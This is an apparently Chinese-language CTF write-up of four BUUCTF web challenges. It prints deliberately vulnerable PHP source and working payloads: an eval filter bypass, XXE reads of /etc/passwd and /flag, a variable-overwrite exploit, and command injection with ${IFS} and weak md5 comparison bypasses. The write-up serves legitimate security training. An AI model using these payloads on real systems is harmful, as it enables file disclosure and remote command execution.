<h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><h2 id="原始信息-6"><a href="#原始信息-6" class="headerlink" title="原始信息"></a>原始信息</h2><p>就这么一句话一个网站，没其他了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flag在哪里呢？</span><br></pre></td></tr></table></figure>

<h2 id="解题-6"><a href="#解题-6" class="headerlink" title="解题"></a>解题</h2><p>这还犹豫什么？扫！</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[<span class="number">200</span>][application/octet-stream][<span class="number">137.00</span>b] http:<span class="comment">//e5bf36bb-762c-4779-8c8d-e50d3cf70de6.node4.buuoj.cn:81/.git/index</span></span><br><span class="line">[<span class="number">200</span>][application/octet-stream][<span class="number">150.00</span>b] http:<span class="comment">//e5bf36bb-762c-4779-8c8d-e50d3cf70de6.node4.buuoj.cn:81/.git/logs/HEAD</span></span><br><span class="line">[<span class="number">200</span>][application/octet-stream][<span class="number">240.00</span>b] http:<span class="comment">//e5bf36bb-762c-4779-8c8d-e50d3cf70de6.node4.buuoj.cn:81/.git/info/exclude</span></span><br><span class="line">[<span class="number">200</span>][application/octet-stream][<span class="number">267.00</span>b] http:<span class="comment">//e5bf36bb-762c-4779-8c8d-e50d3cf70de6.node4.buuoj.cn:81/.git/COMMIT_EDITMSG</span></span><br><span class="line">[<span class="number">200</span>][application/octet-stream][<span class="number">150.00</span>b] http:<span class="comment">//e5bf36bb-762c-4779-8c8d-e50d3cf70de6.node4.buuoj.cn:81/.git/logs/refs/heads/master</span></span><br><span class="line"><span class="number">100</span>% (<span class="number">5719</span> of <span class="number">5719</span>) |<span class="comment">############################################################| Elapsed Time: 0:03:10 Time:  0:03:10</span></span><br></pre></td></tr></table></figure>

<p>git源码泄露，找个工具把源码抓出来。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 工具仅仅抓出个index的原码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">   <span class="comment">// 过滤掉关键伪协议</span></span><br><span class="line">   <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">      <span class="comment">// 过滤完全部的函数必须剩下 &quot;;&quot;（后面能悟出来没继续钻牛角尖还真的是万幸）</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">         <span class="comment">// 过滤函数关键字</span></span><br><span class="line">         <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">               <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line"></span><br><span class="line">               <span class="comment">// eval执行php函数方法</span></span><br><span class="line">               @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 真·隐藏代码高亮</span></span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这题目的过滤很明显，除了要求没有关键字外，就是要求必须全部是函数方法名，必须是a(b())的形式。</p>
<p>根据之前的做题经验，从php自带函数中取出”.”，再取当前文件列表，最后读取文件信息就O了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span> [<span class="number">2</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;.git&quot;</span> [<span class="number">3</span>]=&gt; <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;flag.php&quot;</span> [<span class="number">4</span>]=&gt; <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;index.php&quot;</span> &#125; </span><br><span class="line">-------------------------------------------</span><br><span class="line">?exp=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>()))))));</span><br><span class="line"></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;0fa70868-49c0-4000-8123-8974cb20bad9&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">true</span>) </span><br></pre></td></tr></table></figure>

<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><h2 id="原始信息-7"><a href="#原始信息-7" class="headerlink" title="原始信息"></a>原始信息</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 原始也就一个登录框</span></span><br><span class="line"><span class="comment"># 关键是返回的数据包</span></span><br><span class="line"><span class="comment">// POST的关键信息</span></span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;password&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<h2 id="解题-7"><a href="#解题-7" class="headerlink" title="解题"></a>解题</h2><p>XML格式，XXE漏洞</p>
<p>XXE相关以这位<a target="_blank" rel="noopener" href="https://www.cnblogs.com/s1awwhy/p/13736633.html">大佬</a>和另外一位<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lktop/p/13774088.html">大佬</a>为参考。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;password&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<p>测试存在，尝试直接取flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM <span class="string">&quot;file:///flag&quot;</span>&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;password&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><h2 id="原始信息-8"><a href="#原始信息-8" class="headerlink" title="原始信息"></a>原始信息</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">一个网站，一个URL，目录扫描扫出.git配置文件。</span><br></pre></td></tr></table></figure>

<h2 id="解题-8"><a href="#解题-8" class="headerlink" title="解题"></a>解题</h2><p>解题：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 根据.git下载到源码后，发现了两个文件：index.php flag.php</span></span><br><span class="line"><span class="comment"># index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取post数组并且把key和value的对应关系映射为实质的对应关系。</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">例如：</span></span><br><span class="line"><span class="comment">post:</span></span><br><span class="line"><span class="comment">   whoami=122</span></span><br><span class="line"><span class="comment">后台：</span></span><br><span class="line"><span class="comment">$&#x27;whoami&#x27;=&#x27;122&#x27; =&gt; $whoami=&#x27;122&#x27;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">   <span class="comment">// </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>理解是挺好理解的，但是……一个变量接收后转化为另外一个变量并且赋值为那个变量的值，有点繁琐。<br>说人话，你传什么变量，变量在后台里面的名字由你来定。<br>这题实在是太绕了……</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 白盒分析</span></span><br><span class="line"><span class="comment"># 首先明确一点思路，flag是这样子被导入的：</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"><span class="comment"># 那么我们的思路就是利用各个赋值，把flag变量赋值到其他变量去并且显示出啦。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得POST传输变量的键值对，并且转换为真实存在的PHP变量</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">   <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得GET传输变量的键值对，并且转换为真实存在的PHP变量</span></span><br><span class="line"><span class="comment">// 但是GET变量的值是指向另外一个变量</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面有三种显示变量的方法，都是exit显示的。任意满足一个exit的条件就能出现flag</span></span><br><span class="line"><span class="comment">// 获取get变量的键值对</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">   <span class="comment">// 检测get的flag值是否全等于键</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get:</span><br><span class="line">   /index.php?flag=flag&amp;is=flag</span><br><span class="line"></span><br><span class="line">文件底部出现flag：</span><br><span class="line">   flag&#123;<span class="number">4</span>b2b8505-<span class="number">411</span>b-<span class="number">4</span>aa5-<span class="number">9192</span>-b5e439fa8d90&#125;</span><br></pre></td></tr></table></figure>

<h1 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h1><h2 id="原始信息-9"><a href="#原始信息-9" class="headerlink" title="原始信息"></a>原始信息</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.扫目录发现个：robots.txt</span><br><span class="line"><span class="number">2</span>.打开看见</span><br><span class="line">   User-agent: *</span><br><span class="line">   Disallow: /fAke_f1agggg.php</span><br><span class="line"><span class="number">3</span>.打开/fAke_f1agggg.php，查看数据包部分：</span><br><span class="line">   Look_at_me: /fl4g.php</span><br><span class="line"><span class="number">4</span>.打开/fl4g.php，找到源代码：</span><br></pre></td></tr></table></figure>

<p>源代码在浏览器出现乱码，但可以在F12查数据包的地方看到不乱码的源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Warning: Cannot modify header information - headers already sent <span class="title function_ invoke__">by</span> (output started at /<span class="keyword">var</span>/www/html/fl4g.<span class="attr">php</span>:<span class="number">2</span>) in /<span class="keyword">var</span>/www/html/fl4g.php on line <span class="number">3</span></span><br><span class="line">&lt;img src=<span class="string">&quot;/img.jpg&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">去非洲吧</span><br></pre></td></tr></table></figure>

<h2 id="解题-9"><a href="#解题-9" class="headerlink" title="解题"></a>解题</h2><p>取出核心代码进行分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">   <span class="comment">// 检测空格，有才通过</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">      <span class="comment">// 把所有的cat替换为wctf2020</span></span><br><span class="line">      <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>想要执行到最后的一步system，必须满足前面的各个条件：</p>
<h3 id="绕过1"><a href="#绕过1" class="headerlink" title="绕过1"></a>绕过1</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试使用科学计数法绕过：num=1e10</span></span><br></pre></td></tr></table></figure>

<h3 id="绕过2"><a href="#绕过2" class="headerlink" title="绕过2"></a>绕过2</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要绕过弱类型比较，根据0e开头的字符串弱类型比较时完全相等这点，写一个脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"><span class="comment"># 这里搬运下py脚本，php抛出的结果不尽如人意，只能换py了</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">20</span> ** <span class="number">44</span>):</span><br><span class="line">    i = <span class="string">&#x27;0e&#x27;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">    md5 = hashlib.md5(i.encode()).hexdigest()  <span class="comment"># 把得到的md5加密之后的16进制转换成字符串</span></span><br><span class="line">    <span class="keyword">if</span> md5[:<span class="number">2</span>] == <span class="string">&#x27;0e&#x27;</span> <span class="keyword">and</span> md5[<span class="number">2</span>:].isdigit():  <span class="comment"># [:]做切片：md5[:2]取前两个字符，md5[2:]:从第二个到最后一个字符是不是都是数字。</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;md5:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>抛出对应的对比值后写到参数当中。</p>
<h3 id="最后测试"><a href="#最后测试" class="headerlink" title="最后测试"></a>最后测试</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get:</span><br><span class="line">    /fl4g.php?num=<span class="number">1e10</span>&amp;md5=<span class="number">0e215962017</span>&amp;get_flag=ls</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>:</span><br><span class="line">    我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;<span class="number">404</span>.html</span><br><span class="line">    fAke_f1agggg.php</span><br><span class="line">    fl4g.php</span><br><span class="line">    fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br><span class="line">    img.jpg</span><br><span class="line">    index.php</span><br><span class="line">    robots.txt</span><br></pre></td></tr></table></figure>

<p>找到flag文件后，使用<code>$&#123;IFS&#125;</code>占位并输出flag，绕过空格过滤和cat过滤</p>
